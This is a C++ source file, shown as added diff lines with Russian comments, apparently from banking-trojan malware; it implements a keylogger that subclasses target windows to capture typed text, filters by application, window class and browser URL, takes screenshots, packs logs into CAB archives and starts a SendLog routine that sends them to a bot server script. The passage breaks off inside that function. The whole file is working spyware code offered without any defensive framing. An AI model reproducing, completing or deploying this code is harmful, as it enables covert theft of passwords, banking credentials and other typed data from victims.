+//---------------------------------------------------------------------------
+
+
+PKeyLogSystem KeyLogger::AddSystem(PCHAR Name, DWORD ProcessHash)
+{
+	// Функция регистрирует новую систему кейлогера
+	PKeyLogger Logger = GetLogger(false);
+	if (Logger == NULL)
+		return NULL;
+
+	// Регистрацию системы допускаем только в случае если
+	// для системы не важно в каком она процессе работает либо
+	// система регистрируется для данного процесса
+	if (ProcessHash != 0 && Logger->ProcessNameHash !=  ProcessHash)
+		return NULL;
+
+	PKeyLogSystem S = CreateStruct(TKeyLogSystem);
+	if (S == NULL)
+		return 0;
+
+	// Инициализируем данные системы
+	S->Name            = STR::New(Name);
+	S->ProcessNameHash = ProcessHash;
+	S->Filters         = List::Create();
+	List::SetFreeItemMehod(S->Filters ,  FreeKeyLoggerFilter);
+
+	List::Add(Logger->Systems, S);
+
+    return S;
+}
+//---------------------------------------------------------------------------
+
+PWndFilter KeyLogger::AddFilter(PKeyLogSystem System, PCHAR WndClass, PCHAR WndText,
+					            DWORD Mode, DWORD LogAction, DWORD MaxPArentLevel)
+{
+	// Функция добавляет фильтр окна
+	if (System == NULL)
+		return NULL;
+
+	PWndFilter F = CreateStruct(TWndFilter);
+
+	F->Mode      = Mode;
+	F->Actions   = LogAction;
+	F->ClassName = STR::New(WndClass);
+	F->Text      = STR::New(WndText);
+    F->MaxParentLevel = MaxPArentLevel;
+
+    List::Add(System->Filters, F);
+
+    KLGData.MaxWndParentLevel = Max(KLGData.MaxWndParentLevel, MaxPArentLevel);
+
+    return F;
+
+}
+//---------------------------------------------------------------------------
+
+/*
+DWORD KeyLogger::AddFilter(PCHAR FilterName, TKeyFilterWndMode WndMode,
+	TKeyFilterActions Actions, PCHAR WndClassName, PCHAR WndText,
+	DWORD MaxParentLevel, PKeyLoggerFilterData ExtData)
+{
+	// Добавить фильтр
+	if (GlobalKeyLogger == NULL)
+		return 0;
+
+	PKeyLogSystem Filter = CreateStruct(TKeyLogSystem);
+	if (Filter == NULL)
+		return 0;
+
+	Filter->Name    = STR::New(FilterName);
+	Filter->WndMode = WndMode;
+	Filter->Actions = Actions;
+	Filter->WndClassName   = STR::New(WndClassName);
+	Filter->WndText        = STR::New(WndText);
+	Filter->MaxParentLevel = MaxParentLevel;
+
+	// Добавляем дополнительные данные
+	if (ExtData != NULL)
+	{
+		Filter->Data.SSWidth  = ExtData->SSWidth;
+		Filter->Data.SSHeight = ExtData->SSHeight;
+		Filter->Data.URL      = STR::New(ExtData->URL);
+		Filter->Data.MakeFullScreenShot = ExtData->MakeFullScreenShot;
+		Filter->Data.OnInitializeApp = ExtData->OnInitializeApp;
+    }
+	//
+
+
+	List::Add(GlobalKeyLogger->Filters, Filter);
+
+
+
+	if (MaxParentLevel > GlobalKeyLogger->MaxWndParentLevel)
+		GlobalKeyLogger->MaxWndParentLevel = MaxParentLevel;
+
+    return (DWORD)Filter;
+}
+
+*/
+
+//---------------------------------------------------------------------------
+
+void KeyLogger::WriteBuffer()
+{
+	// Записать буфер введённых символов в файл
+    PKeyLogger Logger = GetLogger(true);
+	if (Logger == NULL || Logger->Position == 0)
+		return;
+
+	WriteToFile(Logger->ActiveWND, NULL, KEYLOGGER_DATA_TEXT, Logger->Buffer, Logger->Position);
+
+	Logger->Position = 0;
+    *Logger->Buffer = 0;
+}
+//---------------------------------------------------------------------------
+
+void KeyLoggerCloseFilter(bool CloseSystem)
+{
+	// Функция закрывает активный фильтр
+	if (KLGData.Filter == NULL)
+		return;
+
+     KLGDBG("KeyLogger", "Закрываем текущий фильтр");
+
+	KeyLogger::WriteBuffer();
+
+	List::Remove(KLGData.SystemFilters, KLGData.Filter);
+
+	KLGData.Filter = NULL;
+
+	// Проверяем отработала ли наша система
+	bool Completed = false;
+
+	if (CloseSystem)
+	{
+		if (List::Count(KLGData.SystemFilters) == 0)
+			Completed = true;
+		else
+			Completed =  KLGData.System->FiltersInORMode;
+    }
+
+	if (Completed)
+	{
+		KLGDBG("KeyLogger", "Система отработала. Закрываем файл с данными");
+		KLGData.SystemCompleted = TRUE;
+		KeyLogger::CloseSession();
+    }
+}
+//---------------------------------------------------------------------------
+
+
+bool KeyLoggerSetActiveFilter(PKeyLogSystem System, PWndFilter Filter)
+{
+	// Устанавливаем текущий фильтр и систему
+	if (Filter != NULL && KLGData.Filter == Filter)
+		return true;
+
+
+
+	bool IsNewSystem = false;
+
+	if (KLGData.System != System)
+	{
+		// Закрываем систему
+		IsNewSystem = true;
+		if (KLGData.System != NULL)
+			KeyLogger::CloseSession();
+	}
+	else
+	{
+		// сработал фильтр уже запущенной системы
+		// На случай повторного срабатывания снова добавляем его в список
+		// Не отработавших и закрываем текущий фильтр
+		if (Filter != NULL)
+		{
+			if (List::IndexOf(KLGData.SystemFilters, Filter) < 0)
+				List::Add(KLGData.SystemFilters, Filter);
+		}
+
+		KeyLoggerCloseFilter(false);
+    }
+
+	// Устанавливаем значения
+	KLGData.System = System;
+	KLGData.Filter = Filter;
+
+	if (System == NULL)
+		return false;
+
+	bool MakeScreenShot;
+
+	if (Filter != NULL)
+		MakeScreenShot = Filter->MakeScreenShot;
+
+	if (IsNewSystem)
+	{
+
+		KLGDBG("KeyLogger", "Запущена система кейлогера [%s]", System->Name);
+
+		KLGData.System = System;
+
+		PCHAR URL = KeyLogger::GetCurrentURL();
+
+		// Проверяем адрес браузера
+		if (!STR::IsEmpty(System->URL))
+		{
+			if (!WildCmp(URL, System->URL))
+				return false;
+        }
+
+		KLGData.ActionsCount = 0;
+        KLGData.MaxActions   = 0;
+		KLGData.UseActionTimer = false;
+		KLGData.LastActionTime = 0;
+		KLGData.RemoveSystemAfterCompleted = false;
+
+		// Для контроля на отработавшими фильтрами, при инициализации
+		// системы все фильтры сохраняем в дополнительный список.
+		// По мере отработки фильтра, мы будем его от туда извлекать
+        List::CopyFrom(KLGData.SystemFilters, System->Filters);
+
+		// В случае если для системы установлено несколько фильтров
+		// то разрешение отправки дадим только тогда когда произойдёт
+		// условие выполнения
+		if (List::Count(System->Filters))
+			KLGData.SendAfterCompleted = !System->FiltersInORMode;
+		else
+		{
+			// Система не содержит фильтров, устанавливаем условия закрытия
+			KLGData.UseActionTimer = true;
+			KLGData.LastActionTime = (DWORD)pGetTickCount();
+			KLGData.MaxActions = MAX_ACTIONS_COUNT;
+			KLGData.RemoveSystemAfterCompleted = true;
+		}
+
+		// Вызываем события уведомления
+		if (System->OnActivate != NULL)
+			System->OnActivate(System);
+
+		// Записываем имя в файл
+		KeyLogger::WriteToFile(NULL, NULL, KEYLOGGER_DATA_APPLICATION,
+			System->Name, STR::Length(System->Name));
+
+		// Записываем адрес открытый в браузере
+		if (URL != NULL)
+		{
+			KLGDBG("KeyLogger", "Загруженная страница [%s]", URL);
+			KeyLogger::AddFile(NULL, (PCHAR)URLFileName, URL, STR::Length(URL));
+		}
+
+		if (System->MakeScreenShot)
+        	MakeScreenShot = true;
+	}
+
+	// Вызываем событие фильтра
+	if (Filter != NULL && Filter->OnActivate != NULL)
+		Filter->OnActivate(Filter);
+
+	// В случае если остался один не сработавший фильтр, то помечаем
+	// систему как отработавшую.
+	if (List::Count(KLGData.SystemFilters) == 1)
+	{
+        KLGData.SystemCompleted = TRUE;
+	}
+
+	// записываем пустой блок для изменения времени
+	// последнего доступа к файлу
+	KeyLogger::WriteToFile(NULL, NULL, KEYLOGGER_DATA_NOOP, NULL, NULL);
+
+
+	// При необходимости создаём снимок всего экрана
+	if (MakeScreenShot)
+	{
+		LPBYTE Screen;
+		DWORD ScreenSize;
+		if (ScreenShot::MakeToMem(NULL, 0, 0, 0, 0, NULL, Screen, ScreenSize))
+		{
+			KeyLogger::AddScreenShot(false, Screen, ScreenSize);
+			MemFree(Screen);
+		}
+	}
+
+	return true;
+}
+//---------------------------------------------------------------------------
+
+void KeyLogger::SetActiveWnd(HWND Wnd)
+{
+	// Установить активное окно
+    PKeyLogger Logger = GetLogger(true);
+	if (Logger == NULL || Logger->ActiveWND == Wnd)
+		return;
+
+	if (Logger->ActiveWND != NULL)
+	{
+		WriteBuffer();
+
+		// Восстанавливаем оконную процедуру
+		SubClassing::RestoreWndProc(Logger->WndProcList, Logger->ActiveWND);
+
+//		if (KLGData.FilterParentWND != NULL)
+//		{
+//			SubClassing::RestoreWndProc(Logger->WndProcList, KLGData.FilterParentWND);
+//			KLGData.FilterParentWND = NULL;
+//		}
+//
+//		Logger->ActiveWND = NULL;
+	}
+
+    if (Wnd == NULL) return;
+
+
+	PKeyLogSystem System = NULL;
+	PWndFilter Filter = NULL;
+
+	HWND ParentWND = NULL;
+
+	if (!FiltrateWnd(Wnd, klaKeyboard, 0, &System, &Filter, &ParentWND))
+	{
+		KeyLoggerCloseFilter();
+		return;
+	}
+
+	KLGData.LastActionTime = (DWORD)pGetTickCount();
+
+	KLGDBG("KeyLogger", "Сменилось активное окно");
+
+   	// Устанавливаем активный фильтр
+	bool Ready = KeyLoggerSetActiveFilter(System, Filter);
+	if (!Ready) return;
+
+	Logger->ActiveWND = Wnd;
+
+	// Подменяем оконную процедуру
+	LPVOID Res = SubClassing::SetWindowProc(Logger->WndProcList, Wnd, KeyLoggerSubClassingWndProc);
+	if (Res != NULL)
+		KLGDBG("KeyLogger", "Оконная процедура успешна заменена");
+
+//	if (ParentWND != NULL)
+//	{
+//		KLGData.FilterParentWND = ParentWND;
+//		SubClassing::SetWindowProc(Logger->WndProcList, ParentWND, KeyLoggerPraentWndProc);
+//    }
+}
+//---------------------------------------------------------------------------
+
+bool KeyLogger::WriteToFile(HWND Sender, PCHAR BlockName, DWORD DataType, LPVOID Data, DWORD DataSize)
+{
+	// Добавить порцию данных в файл
+	PKeyLogger Logger = GetLogger(true);
+	if (Logger == NULL)
+		return false;
+
+	// Инициализируем даннные для пустого блока
+	if (DataType == KEYLOGGER_DATA_NOOP)
+	{
+		Data = Logger; // Берём указатель на любой блок памяти нашего процесса
+        DataSize = 1;
+    }
+
+	if (Data == NULL || DataSize == 0)
+		return false;
+
+
+	// Определяем имя файла
+	if (Logger->FileName == NULL)
+		Logger->FileName = DataGrabber::GetKeyLoggerFileName();
+
+	if (Logger->FileName == NULL)
+		return false;
+
+	// Открываем файл
+	HANDLE File	= (HANDLE)pCreateFileA(Logger->FileName, GENERIC_WRITE, FILE_SHARE_READ, 0, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
+	if (File == INVALID_HANDLE_VALUE)
+		return false;
+
+     DWORD Writen = 0;
+
+	// Обновляем заголовок файла
+	TKLGFileHeader H;
+	ClearStruct(H);
+
+	H.Signature         = KLGFileSignature;
+	H.Version           = KLGFileVersion;
+	H.Closed            = KLGData.FileClosed;
+	H.SendOnlyCompleted = KLGData.SendAfterCompleted;
+	H.Completed         = KLGData.SystemCompleted;
+	H.AppHash           = Logger->ProcessNameHash;
+	H.PID               = Logger->PID;
+
+    pWriteFile(File, &H, sizeof(H), &Writen, NULL);
+
+
+	// Смещаем курсор на конец файла
+    pSetFilePointer(File, 0, 0, FILE_END);
+
+
+	// Записываем заголовок блока
+	TLoggerBlockHead Head;
+	Head.WND 	  = (DWORD)Sender;
+	Head.DataType = DataType;
+	Head.Size     = DataSize;
+    Head.NameSize = StrCalcLength(BlockName);
+
+	// Записываем Заголовок блока
+	pWriteFile(File, &Head, sizeof(Head), &Writen, NULL);
+
+	// Записываем имя блока
+	if (Head.NameSize != 0)
+		pWriteFile(File, BlockName, Head.NameSize, &Writen, NULL);
+
+	// Записываем данные
+	pWriteFile(File, Data, DataSize, &Writen, NULL);
+
+	pCloseHandle(File);
+	return true;
+}
+//---------------------------------------------------------------------------
+
+bool KeyLoggerCheckFileTimeToSend(HANDLE File)
+{
+
+	// Функция проверяет время последнего изменения файла и, если оно
+	// удовлетворяет условиям? djpdhfoftn bcnbye
+
+    const static ULONGLONG SendInterval = 3000000000; // 10000000 * 60 * 5;
+
+	// Получаем время файла
+	FILETIME Create, Write, Access, Now;
+
+	pGetFileTime(File, &Create, &Access, &Write);
+
+
+	// Получаем системное время
+	pGetSystemTimeAsFileTime(&Now);
+
+	// Сравниваем время
+	ULARGE_INTEGER  T1, T2;
+
+	T1.LowPart  = Now.dwLowDateTime;
+	T1.HighPart = Now.dwHighDateTime;
+
+	T2.LowPart  = Write.dwLowDateTime;
+	T2.HighPart = Write.dwHighDateTime;
+
+	ULONGLONG Delta = T1.QuadPart - T2.QuadPart;
+
+	return (Delta >= SendInterval);
+
+}
+
+//---------------------------------------------------------------------------
+
+
+bool KeyLogger::CanSendLoggerFile(PCHAR FileName, bool *InvalidFile)
+{
+	// Функция возвращает истину если файл готов к отправке
+	#define SetInvalid(B) {if (InvalidFile != NULL) *InvalidFile = B;}
+
+	SetInvalid(false);
+
+	if (STR::IsEmpty(FileName))
+		return false;
+
+	HANDLE File	= (HANDLE)pCreateFileA(FileName, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
+	if (File == INVALID_HANDLE_VALUE)
+		return false;
+
+    bool Result = false;
+
+
+	TKLGFileHeader H;
+    DWORD Readed = 0;
+	pReadFile(File, &H, sizeof(H), &Readed, NULL);
+
+	if (Readed != sizeof(H) || H.Signature != KLGFileSignature  || H.Version != KLGFileVersion)
+	{
+		  SetInvalid(true);
+		  pCloseHandle(File);
+		  return false;
+	}
+
+
+	if (H.Closed)
+	{
+		// В слкчае если файл закрыт то результат устанавливаем в зависимости
+		// от того завершена ли система
+		if (H.SendOnlyCompleted)
+		{
+			if (H.Completed)
+				Result = true;
+			else
+				SetInvalid(true);
+        }
+		else
+			Result = H.Completed == true;
+	}
+	else
+	{
+		// В случае если файл не закрыт то разрешаем отправку в случае
+		// если система завершена (по требованию) либо прошло больше
+		// определённого времени
+		if (H.SendOnlyCompleted)
+			Result = H.Completed;
+		 else
+		 	Result = KeyLoggerCheckFileTimeToSend(File);
+    }
+
+
+	pCloseHandle(File);
+	return Result;
+}
+
+//---------------------------------------------------------------------------
+
+void KeyLogger::CloseSession()
+{
+	// Закрыть текущую сессию кейлогера
+	// Записывает текущий буфер в файл и освобождает файл
+	PKeyLogger Logger = GetLogger(true);
+	if (Logger == NULL)
+		return;
+
+    KLGDBG("KeyLogger", "Закрываем сессию кейлогера");
+
+	if (KLGData.System != NULL)
+	{
+		KLGData.FileClosed = TRUE;
+
+        KeyLoggerCloseFilter();
+		WriteBuffer();
+        WriteToFile(NULL, NULL, KEYLOGGER_DATA_NOOP, NULL, 0);
+	}
+
+
+	STR::Free2(Logger->FileName);
+	Logger->ImageIndex = 0;
+	SetActiveWnd(NULL);
+
+
+	if (KLGData.SystemCompleted &&  KLGData.RemoveSystemAfterCompleted)
+	{
+		// При необходимости
+		List::Remove(Logger->Systems, KLGData.System);
+    }
+
+	KLGData.System = NULL;
+	KLGData.Filter = NULL;
+	List::Clear(KLGData.SystemFilters);
+    KLGData.FileClosed = FALSE;
+	KLGData.SendAfterCompleted = FALSE;
+    KLGData.SystemCompleted = FALSE;
+}
+
+//---------------------------------------------------------------------------
+
+bool DoKeyLoggerFiltrate(HWND Wnd, DWORD Action,
+	DWORD WndLevel, PWndFilter Filter, PCHAR &ClassName, PCHAR WndText)
+{
+	// Отфильтровываем окно
+
+	//------- Проверяем принадлежность окна -------------//
+	if (WndLevel > 0 && (Filter->Mode & FILTRATE_PARENT_WND) == 0)
+		return false;
+
+	//----------- Проверяем тип действие ----------------//
+	if (Action != 0 && (Filter->Actions & Action) == 0)
+		return false;
+
+
+	bool Valid = false;
+
+
+	//------------ Проверяем класс окна -----------------//
+	if (!STR::IsEmpty(Filter->ClassName))
+	{
+		if (ClassName == NULL)
+		{
+			// Определяем класс окна
+			static const DWORD MaxClassNameLen = 256;
+			ClassName = STR::Alloc(MaxClassNameLen);
+			pGetClassNameA(Wnd, ClassName, MaxClassNameLen);
+		}
+
+		Valid = StrSame(Filter->ClassName, ClassName, false);
+		if (!Valid) return false;
+	}
+
+	//------------ Проверяем текст окна -----------------//
+	if (!STR::IsEmpty(Filter->Text))
+	{
+		if (WndText == NULL)
+		{
+			// Определяем текст окна
+			WndText = GetWndText(Wnd);
+		}
+
+		Valid = StrCompare(Filter->Text, WndText) == 0;
+		if (!Valid) return false;
+
+	}
+
+
+    return true;
+}
+
+
+bool KeyLogger::FiltrateWnd(HWND Wnd, DWORD Action, DWORD WndLevel,
+				            PKeyLogSystem *System, PWndFilter *Filter, HWND *ParentWND)
+{
+	// Фильтровать окно
+	if (System != NULL)
+		*System = NULL;
+
+	if (Filter != NULL)
+		*Filter = NULL;
+
+	if (ParentWND != NULL)
+		*ParentWND = NULL;
+
+	PKeyLogger Logger = GetLogger(true);
+
+	if (Wnd == NULL || Logger == NULL)
+		return false;
+
+
+	DWORD Count = List::Count(Logger->Systems);
+	if (Count == 0)	return false;
+
+
+	// Проверяем уровень вложенности
+	if (KLGData.MaxWndParentLevel == 0)
+		KLGData.MaxWndParentLevel = MAX_PARENTWND_LEVEL;
+	if (WndLevel > KLGData.MaxWndParentLevel)
+		return false;
+
+	bool Result = false;
+	PCHAR WndClass = NULL;
+	PCHAR WndText = NULL;
+	bool Recursive = false; // Будем проверять на необходимость рекурсивной фильтрации
+
+	// Перебираем все системы
+	for (DWORD i = 0; i < Count; i++)
+    {
+		PKeyLogSystem Sys = (PKeyLogSystem)List::GetItem(Logger->Systems, i);
+
+		DWORD Count = List::Count(Sys->Filters);
+		if (Count == 0)
+		{
+			// В случае когда для системы не указаны фильтры
+			// то будем отфильтровывать все окна
+			if (WndLevel == 0 && Sys->ProcessNameHash == Logger->ProcessNameHash)
+			{
+				Result = true;
+				if (System != NULL)
+					*System = Sys;
+				break;
+            }
+
+
+        	continue;
+		}
+
+		// Перебираем все фильтры системы
+		for (DWORD j = 0; j < Count; j++)
+		{
+            PWndFilter Filt = (PWndFilter)List::GetItem(Sys->Filters, j);
+			if ((Filt->Mode & FILTRATE_PARENT_WND) == 0)
+			{
+				// Если установлен режим проверки только себя, то в случае
+				// более высокого уровня вложения игнорируем фильтр
+				if (WndLevel > 0) continue;
+			}
+			else
+				Recursive = true;
+
+			// Проверяем уровень вложенности текущего фильтра
+			if (Filt->MaxParentLevel != 0 && WndLevel > Filt->MaxParentLevel)
+				continue;
+
+			Result = DoKeyLoggerFiltrate(Wnd, Action, WndLevel, Filt, WndClass, WndText);
+
+			// В случае успеха прерываем фильтрацию
+			if (Result)
+			{
+				if (System != NULL)
+					*System = Sys;
+
+				if (Filter != NULL)
+					*Filter = Filt;
+
+				if (ParentWND != NULL && WndLevel > 0)
+					*ParentWND = Wnd;
+
+				break;
+			}
+		}
+
+		if (Result)
+			break;
+	}
+
+	STR::Free(WndClass);
+	STR::Free(WndText);
+
+
+	if (!Result && Recursive)
+	{
+		// Проверяем родительское окно
+		Wnd = (HWND)pGetParent(Wnd);
+		WndLevel++;
+		Result = FiltrateWnd(Wnd, Action, WndLevel, System, Filter, ParentWND);
+    }
+
+	return Result;
+}
+//----------------------------------------------------------------------------
+
+
+bool KeyLogger::ConnectEventHandler(DWORD EventID, TKeyLoggerEventHandler Handler)
+{
+	// Подключить обработчик события кейлогера
+	if (Handler == NULL)
+		return false;
+
+	PKeyLogger Logger = GetLogger(false);
+	if (Logger == NULL)
+		return false;
+
+    // Проверяем на существование такого обработчика
+	for (int i = List::Count(Logger->Events) - 1; i >= 0; i--)
+	{
+		PKLGEventHandlerItem Item = (PKLGEventHandlerItem)List::GetItem(Logger->Events, i);
+		if (Item == NULL)
+		{
+			List::Delete(Logger->Events, i);
+			continue;
+        }
+
+		if (Item->Handler == Handler && Item->EventID == EventID)
+			return true;
+	}
+
+    // Добавляем новый обработчик
+	PKLGEventHandlerItem Item = CreateStruct(TKLGEventHandlerItem);
+	if (Item == NULL)
+		return false;
+
+	Item->EventID = EventID;
+    Item->Handler = Handler;
+
+	List::Add(Logger->Events, Item);
+	return true;
+}
+
+//----------------------------------------------------------------------------
+
+
+void KeyLogger::DisconnectEventHandler(DWORD EventID, TKeyLoggerEventHandler Handler)
+{
+	// Отключить обработчик события
+	PKeyLogger Logger = GetLogger(false);
+	if (Logger == NULL)
+		return;
+
+
+	for (int i = List::Count(Logger->Events) - 1; i >= 0; i--)
+	{
+		PKLGEventHandlerItem Item = (PKLGEventHandlerItem)List::GetItem(Logger->Events, i);
+		if (Item == NULL)
+		{
+			List::Delete(Logger->Events, i);
+			continue;
+        }
+
+		if (Item->Handler == Handler && (EventID == 0 || Item->EventID == EventID))
+			List::Delete(Logger->Events, i);
+	}
+}
+
+
+
+
+
+
+
+//============================================================================
+//Методы упаеовки данных логера в CAB архив
+namespace LoggerCabPacker
+{
+	typedef struct TKeyLogPacker
+	{
+		PCHAR  TempFileName;
+		HCAB   CabHandle;
+		HANDLE FileHandle;
+		PList TextBlocks;
+		PCHAR Application;
+	} *PKeyLogPacker;
+
+    //-------------------------------------------------------------------------
+	void FreeStrBlock(LPVOID Data)
+	{
+		if (Data == NULL) return;
+		PMemBlock Block = (PMemBlock)Data;
+		STR::Free((PCHAR)Block->Data);
+		FreeStruct(Block);
+	}
+
+	//-------------------------------------------------------------------------
+
+	PKeyLogPacker Initialize(PCHAR FileName, PCHAR CabName)
+	{
+		// Инициализировать данные для добавления в каб архив
+		if (STR::IsEmpty(FileName) || STR::IsEmpty(CabName))
+			return NULL;
+
+		// Открываем файл
+        HANDLE File = (HANDLE)pCreateFileA(FileName, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
+		if (File == INVALID_HANDLE_VALUE)
+			return NULL;
+
+		// Создаём CAB архив
+		HCAB Cab = CreateCab(CabName);
+		if (Cab == NULL)
+		{
+			pCloseHandle(File);
+			return NULL;
+        }
+
+		// Инициализируем структуры
+		PKeyLogPacker P = CreateStruct(TKeyLogPacker);
+		if (P == NULL)
+		{
+			pCloseHandle(File);
+			CloseCab(Cab);
+		}
+
+		P->FileHandle   = File;
+		P->CabHandle    = Cab;
+		P->TempFileName = STR::New(2, FileName, ".tmp");
+		P->TextBlocks   = List::Create();
+
+		List::SetFreeItemMehod(P->TextBlocks, FreeStrBlock);
+
+        return P;
+
+	}
+	//-------------------------------------------------------------------------
+	void DeleteTempFile(PKeyLogPacker Packer)
+	{
+		if (!FileExistsA(Packer->TempFileName))
+			return;
+		// Файл может использоваться некоторое время по этому будем делать
+		// несколько попыток удаленя
+		for (int i = 0; i < 40; i++)
+        {
+			if (!pDeleteFileA(Packer->TempFileName))
+				pSleep(50);
+			else
+                break;
+		}
+    }
+
+	//-------------------------------------------------------------------------
+	void AddTextData(PKeyLogPacker Packer, PLoggerBlockHead Head, LPVOID Data)
+	{
+		// Добавить текстовый блок в список
+		PMemBlock Block = CreateStruct(TMemBlock);
+
+		Block->ID   = Head->WND;
+		Block->Size = Head->Size;
+		Block->Data = STR::New((PCHAR)Data, Head->Size);
+
+        List::Add(Packer->TextBlocks, Block);
+	}
+	//-------------------------------------------------------------------------
+
+	void PackTextBlocks(PKeyLogPacker Packer)
+	{
+		// Упаковать текстовые блоки
+		if (List::Count(Packer->TextBlocks) == 0)
+			return;
+
+		// Создаём файл
+		PCHAR FileName = STR::New(2, Packer->TempFileName, "s");
+
+        HANDLE File = (HANDLE)pCreateFileA(FileName, GENERIC_WRITE, FILE_SHARE_READ, 0, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, 0);
+		if (File == INVALID_HANDLE_VALUE)
+		{
+			STR::Free(FileName);
+			return;
+		}
+
+		DWORD Writed;
+		PMemBlock Block;
+		DWORD Wnd;
+		//PCHAR Buf;
+		DWORD i;
+        // Записываем блоки в файл сортируф данные по окну
+		while (List::Count(Packer->TextBlocks) > 0)
+		{
+			Block = (PMemBlock)List::GetItem(Packer->TextBlocks, 0);
+			Wnd = Block->ID;
+
+			// Записываем хэндл окна
+//			PCHAR WndStr = StrLongToString(Wnd);
+//			pWriteFile(File, WndStr, STR::Length(WndStr), &Writed, NULL);
+//			pWriteFile(File, "=", 1, &Writed, NULL);
+//			STR::Free(WndStr);
+
+			// Записываем данные
+			i = 0;
+			while (i < List::Count(Packer->TextBlocks))
+			{
+				Block = (PMemBlock)List::GetItem(Packer->TextBlocks, i);
+				if (Block->ID == Wnd)
+				{
+					pWriteFile(File, Block->Data, Block->Size, &Writed, NULL);
+					List::Delete(Packer->TextBlocks, i);
+				}
+				else
+					i++;
+            }
+
+            // Записываем конец строки
+			pWriteFile(File, "\r\n\r\n", 4, &Writed, NULL);
+
+		}
+
+		pCloseHandle(File);
+
+		// Добавляем файл в архив
+        AddFileToCab(Packer->CabHandle, FileName, "LogData.txt");
+
+		pDeleteFileA(FileName);
+		STR::Free(FileName);
+
+	}
+
+	//=========================================================================
+
+	void SetApplicationName(PKeyLogPacker Packer, PCHAR Name)
+	{
+		// Установить имя системы кейлогера
+		if (Packer->Application != NULL)
+			STR::Free2(Packer->Application);
+
+		Packer->Application = STR::New(Name);
+	}
+
+	//-------------------------------------------------------------------------
+	void AddImage(PKeyLogPacker Packer, PLoggerBlockHead Head, LPVOID Data)
+	{
+		// Добавить картинку в архив
+
+		PCHAR Index = StrLongToString((DWORD)Head->WND);
+		PCHAR Name = STR::New(3, "ScreenShots\\", Index, ".png");
+
+		// Сохраняем картинку в промежуточный файл
+		File::WriteBufferA(Packer->TempFileName, Data, Head->Size);
+
+		// Добавляем в архив
+		AddFileToCab(Packer->CabHandle, Packer->TempFileName, Name);
+
+
+		STR::Free(Index);
+		STR::Free(Name);
+	}
+	//-------------------------------------------------------------------------
+
+	void AddFile(PKeyLogPacker Packer, PLoggerBlockHead Head, PCHAR BlockName, LPVOID Data)
+	{
+		// Сохраняем во временный файл
+		File::WriteBufferA(Packer->TempFileName, Data, Head->Size);
+
+		// Добавляем в архив
+		AddFileToCab(Packer->CabHandle, Packer->TempFileName, BlockName);
+
+		DeleteTempFile(Packer);
+
+    }
+	//-------------------------------------------------------------------------
+
+
+	//-------------------------------------------------------------------------
+
+	bool Pack(PKeyLogPacker Packer)
+	{
+		// Упаковать данные логера
+
+		// Читаем все блоки
+		TLoggerBlockHead Head;
+		DWORD HeadSize = sizeof(Head);
+		DWORD Readed;
+		LPBYTE Data;
+		PCHAR BlockName;
+
+		while (true)
+		{
+			// Читаем заголовок блока
+			pReadFile(Packer->FileHandle, &Head, HeadSize, &Readed, NULL);
+			if (Readed < HeadSize) break;
+
+			if (Head.NameSize != 0)
+			{
+				BlockName = STR::Alloc(Head.NameSize);
+				pReadFile(Packer->FileHandle, BlockName, Head.NameSize, &Readed, NULL);
+				if (Readed < Head.NameSize) break;
+			}
+
+
+
+			if (Head.Size == 0) continue;
+
+			// Читаем данные
+			Data = (LPBYTE)MemAlloc(Head.Size + 1);
+			if (Data == NULL) break;
+
+			pReadFile(Packer->FileHandle, Data, Head.Size, &Readed, NULL);
+			if (Readed < Head.Size)
+			{
+				MemFree(Data);
+				break;
+			}
+
+			*(Data + Readed) = 0;
+
+			// Обрабатываем данные
+			switch (Head.DataType) {
+				// Текстовые данные
+				case KEYLOGGER_DATA_TEXT:        AddTextData(Packer, &Head, Data); break;
+				case KEYLOGGER_DATA_APPLICATION: SetApplicationName(Packer, (PCHAR)Data); break;
+				case KEYLOGGER_DATA_IMAGEPNG:    AddImage(Packer, &Head, Data); break;
+				case KEYLOGGER_DATA_FILE:        AddFile(Packer, &Head, BlockName, Data); break;
+
+			default:
+                ;
+			}
+
+			MemFree(Data);
+			STR::Free2(BlockName);
+        }
+			
+		// Запаковываем текстовые блоки
+		PackTextBlocks(Packer);
+		return true;
+	}
+	//-------------------------------------------------------------------------
+
+	void FreeData(PKeyLogPacker Packer)
+	{
+		// Освобождаем данные пакера
+		if (Packer == NULL)
+			return;
+
+		pCloseHandle(Packer->FileHandle);
+		CloseCab(Packer->CabHandle);
+
+		pDeleteFileA(Packer->TempFileName);
+		STR::Free(Packer->TempFileName);
+
+		STR::Free(Packer->Application);
+
+		List::Free(Packer->TextBlocks);
+		FreeStruct(Packer);
+    }
+}
+
+//============================================================================
+
+
+//----------------------------------------------------------------------------
+
+bool KeyLogger::PackLoggerFileToCAB(PCHAR LogFileName, PCHAR CabFileName, PCHAR *AppName)
+{
+	// Запаковать файл логера в CAB архив
+	// Открываем файл
+	if (LogFileName == NULL) return false;
+	if (AppName != NULL)
+		*AppName = NULL;
+
+    KLGDBG("KeyLogger", "Запаковываем данные кейлогера в CAB архив");
+
+	LoggerCabPacker::PKeyLogPacker Packer =
+						LoggerCabPacker::Initialize(LogFileName, CabFileName);
+	if (Packer == NULL)
+		return false;
+
+	bool Result = LoggerCabPacker::Pack(Packer);
+	if (Result && AppName != NULL)
+		*AppName = STR::New(Packer->Application);
+
+	LoggerCabPacker::FreeData(Packer);
+
+	return Result;
+}
+//----------------------------------------------------------------------------
+
+PCHAR KeyLogger::GetCurrentURL()
+{
+	//  Функция возвращает адрес страницы открытой в данный момент в браузере
+	PKeyLogger L = GetLogger(true);
+	if (L == NULL)
+		return NULL;
+
+	if (L->Process == PROCESS_IE)
+		return KLGData.CurrentURL;
+	else
+	if (L->Process == PROCESS_JAVA)
+		return GetURLFromJavaProcess();
+
+	return NULL;
+}
+//----------------------------------------------------------------------------
+
+bool SendLog(PCHAR URL, DWORD AppHash, DWORD Pid, PCHAR Log, DWORD LogLen)
+{
+	// Функция отправляет отчт на сервер
+	bool FreeURL = STR::IsEmpty(URL);
+
+	if (FreeURL)
+		URL = GetBotScriptURL(SCRIPT_KEYLOGGER);
+	if (URL == NULL)
+		return false;
+
+	if (LogLen == 0)
+    	LogLen = StrCalcLength(Log);
+
+    // Инициализируем данные
+	PCHAR HashStr = StrLongToString(AppHash);
+	PCHAR PidStr  = StrLongToString(Pid);
